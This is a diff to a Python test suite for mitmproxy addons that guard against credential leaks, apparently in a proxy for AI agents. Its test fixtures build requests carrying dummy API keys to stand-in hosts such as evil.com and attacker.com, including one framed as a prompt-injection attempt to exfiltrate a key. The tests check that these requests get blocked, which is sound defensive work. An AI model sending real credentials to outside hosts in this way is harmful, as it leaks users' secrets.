@@ -15,15 +15,13 @@ class TestAddonChainMetadata:
         flow = make_flow(
             method="POST",
             url="https://evil.com/api",
-            content='{"key": "sk-abc123xyz456def789ghijklmno"}',
-            headers={"Content-Type": "application/json"},
+            headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
         )
 
         credential_guard.request(flow)
 
         assert flow.metadata.get("blocked_by") == "credential-guard"
         assert flow.metadata.get("credential_fingerprint") is not None
-        assert flow.metadata.get("blocked_host") == "evil.com"
 
     def test_rate_limiter_sets_blocked_by(self, rate_limiter, make_flow):
         """Test that rate_limiter sets blocked_by metadata."""
@@ -51,19 +49,17 @@ class TestAddonChainMetadata:
 
         assert flow.metadata.get("blocked_by") == "circuit-breaker"
 
-    def test_allowed_requests_set_pass_metadata(self, credential_guard, make_flow):
-        """Test that allowed requests set pass metadata."""
+    def test_allowed_requests_not_blocked(self, credential_guard, make_flow):
+        """Test that allowed requests pass through without blocking."""
         flow = make_flow(
             method="POST",
             url="https://api.openai.com/v1/chat",
-            content='{"key": "sk-abc123xyz456def789ghijklmno"}',
-            headers={"Content-Type": "application/json"},
+            headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
         )
 
         credential_guard.request(flow)
 
         assert flow.response is None  # Not blocked
-        assert flow.metadata.get("credguard_passed") is True
 
 
 class TestAddonChainOrder:
@@ -85,47 +81,13 @@ class TestAddonChainOrder:
         flow = make_flow(
             method="POST",
             url="https://evil.com/api",
-            content='{"key": "sk-abc123xyz456def789ghijklmno"}',
-            headers={"Content-Type": "application/json"},
+            headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
         )
 
         # If rate_limiter runs first (as in production chain)
         rate_limiter.request(flow)
         assert flow.response is not None
         assert flow.metadata.get("blocked_by") == "rate-limiter"
-
-        # Now credential_guard should see response already set
-        # In real mitmproxy, it wouldn't run - but we can verify behavior
-        # if it did - it should see existing response and could skip
-
-    def test_subsequent_addons_see_metadata(self, credential_guard, make_flow):
-        """Test that subsequent addons can see metadata from earlier ones."""
-        from addons.policy import RequestPolicy, AddonPolicy
-
-        flow = make_flow(
-            method="POST",
-            url="https://api.openai.com/v1/chat",
-            content='{"message": "hello"}',
-            headers={"Content-Type": "application/json"},
-        )
-
-        # Simulate first addon (policy) setting metadata with RequestPolicy object
-        # Create a policy where credential_guard is enabled
-        policy = RequestPolicy(
-            addons={
-                "credential-guard": AddonPolicy(enabled=True, settings={}),
-                "yara_scanner": AddonPolicy(enabled=False, settings={}),
-            },
-            bypassed_addons=set()
-        )
-        flow.metadata["policy"] = policy
-
-        # Credential guard should see this
-        credential_guard.request(flow)
-
-        # Both metadata should exist
-        assert "policy" in flow.metadata
-        assert "credguard_passed" in flow.metadata
 
 
 class TestRealisticScenarios:
@@ -136,9 +98,8 @@ class TestRealisticScenarios:
         flow = make_flow(
             method="POST",
             url="https://api.openai.com/v1/chat/completions",
-            content='{"model": "gpt-4", "messages": []}',
             headers={
-                "Authorization": "Bearer sk-abc123xyz456def789ghijklmno",
+                "Authorization": f"Bearer sk-proj-{'a' * 80}",
                 "Content-Type": "application/json",
             },
         )
@@ -161,19 +122,17 @@ class TestRealisticScenarios:
         assert status.failure_count == 0
 
     def test_exfiltration_attempt_blocked(self, credential_guard, make_flow):
-        """Test that credential exfiltration is blocked."""
-        # Simulate prompt injection trying to exfiltrate key
+        """Test that credential exfiltration to wrong host is blocked."""
         flow = make_flow(
             method="POST",
             url="https://attacker.com/log",
-            content='{"stolen_key": "sk-abc123xyz456def789ghijklmno", "data": "user secrets"}',
-            headers={"Content-Type": "application/json"},
+            headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
         )
 
         credential_guard.request(flow)
 
         assert flow.response is not None
-        assert flow.response.status_code == 428  # Phase 3: 428 for greylist responses
+        assert flow.response.status_code == 428
         assert b"credential" in flow.response.content.lower()
 
     def test_circuit_opens_on_upstream_failures(self, circuit_breaker, make_flow, make_response):
@@ -225,7 +184,6 @@ class TestEdgeCases:
 
         # Should not crash on binary content
         credential_guard.request(flow)
-        # Body not scanned (not json/form/text content-type)
         assert flow.response is None
 
     def test_missing_host(self, rate_limiter, make_flow):
@@ -252,16 +210,13 @@ class TestBlockingMode:
         guard.config = {}
         guard.safe_headers_config = {}
 
-        # Set up context with body scanning enabled
         with taddons.context(guard) as tctx:
             tctx.options.credguard_block = False  # Warn-only mode
-            tctx.options.credguard_scan_bodies = True
 
             flow = make_flow(
                 method="POST",
                 url="https://evil.com/api",
-                content='{"key": "sk-abc123xyz456def789ghijklmno"}',
-                headers={"Content-Type": "application/json"},
+                headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
             )
 
             guard.request(flow)
@@ -269,46 +224,6 @@ class TestBlockingMode:
             # Warn-only: no response set, request continues
             assert flow.response is None
             assert guard.violations_total == 1
-
-    def test_warn_mode_still_logs_to_jsonl(self, make_flow, tmp_path):
-        """Test that warn mode still logs violations."""
-        from addons.credential_guard import CredentialGuard, DEFAULT_RULES
-        from mitmproxy.test import taddons
-        from unittest.mock import patch
-        import json
-
-        log_path = tmp_path / "audit.jsonl"
-
-        guard = CredentialGuard()
-        guard.rules = list(DEFAULT_RULES)
-        guard.hmac_secret = b"test-secret"
-        guard.config = {}
-        guard.safe_headers_config = {}
-
-        # Patch the central AUDIT_LOG_PATH to use our temp path
-        with patch("addons.utils.AUDIT_LOG_PATH", log_path):
-            # Set up context with warn mode and body scanning
-            with taddons.context(guard) as tctx:
-                tctx.options.credguard_block = False  # Warn-only mode
-                tctx.options.credguard_scan_bodies = True
-
-                flow = make_flow(
-                    method="POST",
-                    url="https://evil.com/api",
-                    content='{"key": "sk-abc123xyz456def789ghijklmno"}',
-                    headers={"Content-Type": "application/json"},
-                )
-
-                guard.request(flow)
-
-                # Should have logged the violation
-                assert log_path.exists()
-                with open(log_path) as f:
-                    log_entry = json.loads(f.readline())
-                assert log_entry["event"] == "security.credential"
-                assert log_entry["rule"] == "openai"
-                assert log_entry["host"] == "evil.com"
-                assert log_entry["decision"] == "warn"
 
     def test_default_is_block_mode(self):
         """Test that default behavior is block mode."""
@@ -319,6 +234,5 @@ class TestBlockingMode:
 
         # When properly configured with context, default is block mode
         with taddons.context(guard) as tctx:
-            # Default value for credguard_block option
-            assert tctx.options.credguard_block is True  # Default is block mode
+            assert tctx.options.credguard_block is True
             assert guard._should_block() is True
